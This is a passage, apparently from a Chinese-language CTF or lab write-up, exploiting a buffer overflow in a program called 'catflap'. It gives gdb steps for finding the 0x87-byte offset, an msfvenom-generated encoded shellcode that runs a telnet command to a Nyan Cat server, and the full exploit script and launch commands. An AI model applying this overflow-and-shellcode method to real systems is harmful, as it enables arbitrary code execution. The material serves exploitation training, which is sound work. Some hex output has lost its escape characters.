    0x804c150:0x0a0x780x200x780x200x780x200x78
    0x804c158:0x200x780x200x78
在x / 100bx $ eip-30命令中，我们看到每个偶数字节都是递增的，而每个奇数字节都为空。这意味着我们位于缓冲区中。在x / 3bx $
eip命令中，我们看到我们所在的字节是0xa8。我们的offset.py脚本是从0x21处的字节（以避免空白符）开始的，所以我们通过0xa8-0x21得到0x87。也就是说，我们的shellcode前面，是由空白符分隔的0x87个字符。
我们首先用下面的代码来仔细检查一下偏移量：
    $ cat offset.py 
    l = [ ]
    for i in xrange(0x87):
        l.append("Z")
    l.append("BBBB")
    print " ".join(l)
    $ gdb -q catflap 
    Reading symbols from /tmp/catflap...(no debugging symbols found)...done.
    (gdb) b *0x08049186
    Breakpoint 1 at 0x8049186
    (gdb) run asdf "$(python offset.py )"
    Starting program: /tmp/catflap asdf "$(python offset.py )"
    Command string has too many tokens
    Breakpoint 1, 0x08049186 in ?? ()
    (gdb) ni
    0x0804c116 in ?? ()
    (gdb) x/5bx $eip
    0x804c116:0x420x420x420x420x00
我们到达了第一个“B”（0x42），所以我们只需要把shellcode放在那里，就可以让代码执行了。我们到哪里下载Nyan Cat shellcode呢？
当然是Metasploit！为此，我们只需要运行命令“telnet
nyancat.dakko.us”即可。Metasploit的msfvenom有一个“linux / x86 /
exec”有效载荷，可以执行telnet命令。当在命令行中运行它时，可以使用ASCII编码器使其更加漂亮。
注意：不要忘记坏字节。空字节实际上是允许的，因为我们可以用0x20替换它，程序会把它变成一个0x00。不过，这有可能把偏移量搞砸，所以最好避免使用。
    $ cat ~/exploit.py 
    #!/usr/bin/python
    import sys
    # telnet nancat
    # > msfvenom -p linux/x86/exec  -b 'x20x09' -v shellcode  -f python CMD="telnet 
    nyancat.dakko.us" -e x86/alpha_mixed
    # No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    # No Arch selected, selecting Arch: x86 from the payload
    # Found 1 compatible encoders
    # Attempting to encode payload with 1 iterations of x86/alpha_mixed
    # x86/alpha_mixed succeeded with size 179 (iteration=0)
    # x86/alpha_mixed chosen with final size 179
    # Payload size: 179 bytes
    # Final size of python file: 972 bytes
    shellcode =  ""
    shellcode += "x89xe1xdaxcbxd9x71xf4x5ax4ax4ax4ax4a"
    shellcode += "x4ax4ax4ax4ax4ax4ax4ax43x43x43x43x43"
    shellcode += "x43x37x52x59x6ax41x58x50x30x41x30x41"
    shellcode += "x6bx41x41x51x32x41x42x32x42x42x30x42"
    shellcode += "x42x41x42x58x50x38x41x42x75x4ax49x62"
    shellcode += "x4ax46x6bx51x48x4ax39x73x62x35x36x33"
    shellcode += "x58x74x6dx31x73x6cx49x69x77x50x68x56"
    shellcode += "x4fx61x63x73x58x75x50x43x58x36x4fx50"
    shellcode += "x62x71x79x30x6ex6cx49x79x73x51x42x79"
    shellcode += "x78x42x38x47x70x77x70x75x50x52x54x31"
    shellcode += "x75x70x6cx70x6ex31x75x44x34x75x70x50"
    shellcode += "x6ex51x69x30x61x30x6ex33x53x63x51x71"
    shellcode += "x64x74x6ex30x64x53x51x72x4bx32x4bx50"
    shellcode += "x6fx64x6ex72x55x74x33x55x50x42x77x76"
    shellcode += "x33x6fx79x48x61x38x4dx4dx50x41x41"
    l = []
    for i in xrange(0x87):
        l.append("A")
    l.append(shellcode) 
    if ( len(sys.argv) == 1 ) :
        print  " ".join(l) 
    else:
        print  repr( " ".join(l) )
最后执行：
    $ ./catflap asdf "$(python ~/exploit.py )"
或者：
    $ python ~/exploit.py a
    'A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A 
    x89xe1xdaxcbxd9qxf4ZJJJJJJJJJJJCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIbJFkQHJ9sb563Xtm1slIiwPhVOacsXuPCX6OPbqy0nlIysQByxB8GpwpuPRT1uplpn1uD4upPnQi0a0n3ScQqdtn0dSQrK2KPodnrUt3UPBwv3oyHa8MMPAA'
    $ ./catflap a "$(printf 'A A A A A A A A A A A A A A A A A A A A A A A A A A A A
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A
    A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    A A A A A A A A A A A A A A A A A A A A A A A A A A A 
    x89xe1xdaxcbxd9qxf4ZJJJJJJJJJJJCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIbJFkQHJ9sb563Xtm1slIiwPhVOacsXuPCX6OPbqy0nlIysQByxB8GpwpuPRT1uplpn1uD4upPnQi0a0n3ScQqdtn0dSQrK2KPodnrUt3UPBwv3oyHa8MMPAA')"
具体效果，请看下面的视频：